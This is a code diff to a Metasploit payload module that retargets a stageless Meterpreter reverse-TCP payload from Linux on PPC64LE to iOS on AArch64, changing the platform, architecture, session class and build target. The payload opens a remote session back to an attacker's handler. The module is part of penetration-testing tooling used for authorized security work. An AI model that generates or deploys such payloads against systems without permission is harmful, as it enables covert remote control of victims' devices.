@@ -6,11 +6,11 @@
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/meterpreter_options'
 require 'msf/base/sessions/mettle_config'
-require 'msf/base/sessions/meterpreter_ppc64le_linux'
+require 'msf/base/sessions/meterpreter_aarch64_apple_ios'
 
 module MetasploitModule
 
-  CachedSize = 1014024
+  CachedSize = 692552
 
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions
@@ -20,18 +20,18 @@ module MetasploitModule
     super(
       update_info(
         info,
-        'Name'          => 'Linux Meterpreter, Reverse TCP Inline',
+        'Name'          => 'Apple_iOS Meterpreter, Reverse TCP Inline',
         'Description'   => 'Run the Meterpreter / Mettle server payload (stageless)',
         'Author'        => [
           'Adam Cammack <adam_cammack[at]rapid7.com>',
           'Brent Cook <brent_cook[at]rapid7.com>',
           'timwr'
         ],
-        'Platform'      => 'linux',
-        'Arch'          => ARCH_PPC64LE,
+        'Platform'      => 'apple_ios',
+        'Arch'          => ARCH_AARCH64,
         'License'       => MSF_LICENSE,
         'Handler'       => Msf::Handler::ReverseTcp,
-        'Session'       => Msf::Sessions::Meterpreter_ppc64le_Linux
+        'Session'       => Msf::Sessions::Meterpreter_aarch64_Apple_iOS
       )
     )
   end
@@ -41,6 +41,6 @@ module MetasploitModule
       scheme: 'tcp',
       stageless: true
     }
-    MetasploitPayloads::Mettle.new('powerpc64le-linux-musl', generate_config(opts)).to_binary :exec
+    MetasploitPayloads::Mettle.new('aarch64-iphone-darwin', generate_config(opts)).to_binary :exec
   end
 end
